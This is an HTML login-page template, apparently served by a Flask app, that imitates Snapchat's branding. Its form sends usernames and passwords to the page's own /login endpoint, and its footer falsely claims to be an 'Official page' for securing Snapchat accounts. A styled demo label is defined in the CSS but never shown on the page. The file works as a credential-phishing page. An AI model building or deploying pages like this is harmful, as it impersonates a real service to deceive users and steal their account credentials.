<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Snapchat Login </title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      background: #fffc00;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      background: #ffffff;
      border-radius: 18px;
      padding: 35px 30px;
      text-align: center;
      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
    }

    .demo-label {
      display: inline-block;
      margin-bottom: 20px;
      padding: 7px 12px;
      background: #fff3cd;
      color: #664d03;
      border: 1px solid #ffecb5;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
    }

    .logo {
      width: 78px;
      height: 78px;
      margin: 0 auto 20px;
      background: #000000;
      color: #ffffff;
      border-radius: 26px 26px 32px 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
      font-weight: bold;
    }

    .logo img{
      width: 100%;
      height: 100%;

      object-fit: cover;   
      display: block;
    }

    h1 {
      color: #111111;
      font-size: 27px;
      margin-bottom: 8px;
    }

    .subtitle {
      color: #666666;
      font-size: 14px;
      margin-bottom: 28px;
      line-height: 1.5;
    }

    .form-group {
      text-align: left;
      margin-bottom: 18px;
    }

    label {
      display: block;
      color: #333333;
      font-size: 13px;
      font-weight: bold;
      margin-bottom: 7px;
    }

    input {
      width: 100%;
      height: 48px;
      padding: 0 14px;
      border: 1px solid #cccccc;
      border-radius: 9px;
      font-size: 15px;
      outline: none;
      transition: 0.2s;
    }

    input:focus {
      border-color: #111111;
      box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08);
    }

    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-right: 70px;
    }

    .show-password {
      position: absolute;
      right: 13px;
      top: 50%;
      transform: translateY(-50%);
      border: none;
      background: transparent;
      color: #444444;
      font-size: 12px;
      font-weight: bold;
      cursor: pointer;
    }

    .forgot-link {
      display: block;
      text-align: right;
      color: #555555;
      font-size: 13px;
      text-decoration: none;
      margin-top: -8px;
      margin-bottom: 20px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .login-button {
      width: 100%;
      height: 48px;
      border: none;
      border-radius: 24px;
      background: #000000;
      color: #ffffff;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }

    .login-button:hover {
      background: #252525;
      transform: translateY(-1px);
    }

    .login-button:disabled {
      background: #999999;
      cursor: not-allowed;
      transform: none;
    }

    .message {
      display: none;
      margin-top: 18px;
      padding: 12px;
      border-radius: 8px;
      font-size: 13px;
      line-height: 1.5;
    }

    .message.success {
      display: block;
      background: #d1e7dd;
      color: #0f5132;
      border: 1px solid #badbcc;
    }

    .message.error {
      display: block;
      background: #f8d7da;
      color: #842029;
      border: 1px solid #f5c2c7;
    }

    .signup-text {
      margin-top: 25px;
      color: #666666;
      font-size: 14px;
    }

    .signup-text a {
      color: #000000;
      font-weight: bold;
      text-decoration: none;
    }

    .security-note {
      margin-top: 22px;
      padding-top: 18px;
      border-top: 1px solid #eeeeee;
      color: #777777;
      font-size: 11px;
      line-height: 1.5;
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 28px 20px;
      }

      h1 {
        font-size: 24px;
      }
    }
  </style>
</head>

<body>
  <main class="login-container">
    

    <div class="logo" aria-label="Logo">
        <img
	    src="{{ url_for('static', filename='images/logo.jpg') }}"
	    alt="Logo"
	>
    </div>

    <h1>Log in</h1>

    <p class="subtitle">
      This ensure your account security. Please enter your username & password.
    </p>

    <form
      id="loginForm"
      action="/login"
      method="POST"
      autocomplete="off"
    >
      <div class="form-group">
        <label for="username">Username</label>

        <input
          type="text"
          id="username"
          name="username"
          placeholder="Enter Your Username"
          maxlength="50"
          required
        />
      </div>

      <div class="form-group">
        <label for="password">Password</label>

        <div class="password-wrapper">
          <input
            type="password"
            id="password"
            name="password"
            placeholder="Enter Your Password"
            maxlength="50"
            required
          />

          <button
            type="button"
            class="show-password"
            id="togglePassword"
          >
            SHOW
          </button>
        </div>
      </div>

      <a href="/forgot-password" class="forgot-link">
        Forgot password?
      </a>

      <button type="submit" class="login-button" id="loginButton">
        Log In
      </button>

      <div class="message" id="message" role="alert"></div>
    </form>

    <p class="signup-text">
      Don't have an account?
      <a href="#" id="signupLink">Create an account</a>
    </p>

    <p class="security-note">
      This Official page is intended only to secure your Snapchat account.
    </p>
  </main>

</body>
</html>
